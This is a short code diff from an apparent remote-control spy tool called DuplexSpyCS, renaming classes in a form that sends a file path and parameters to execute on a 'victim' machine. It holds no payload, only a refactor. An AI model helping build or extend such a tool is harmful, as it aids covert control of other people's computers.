@@ -12,7 +12,7 @@ namespace DuplexSpyCS
 {
     public partial class frmFileMgrExec : Form
     {
-        public Victim v;
+        public clsVictim v;
         public string szRemoteExecutable = string.Empty;
         public string szCurrentDir = string.Empty;
 
@@ -34,8 +34,8 @@ namespace DuplexSpyCS
                 BooleanToIntString(bCreateNoWindow),
                 BooleanToIntString(bTimeout),
                 nTimeout.ToString(),
-                Crypto.b64E2Str(filePath),
-                Crypto.b64E2Str(fileParams),
+                clsCrypto.b64E2Str(filePath),
+                clsCrypto.b64E2Str(fileParams),
             }));
         }
 
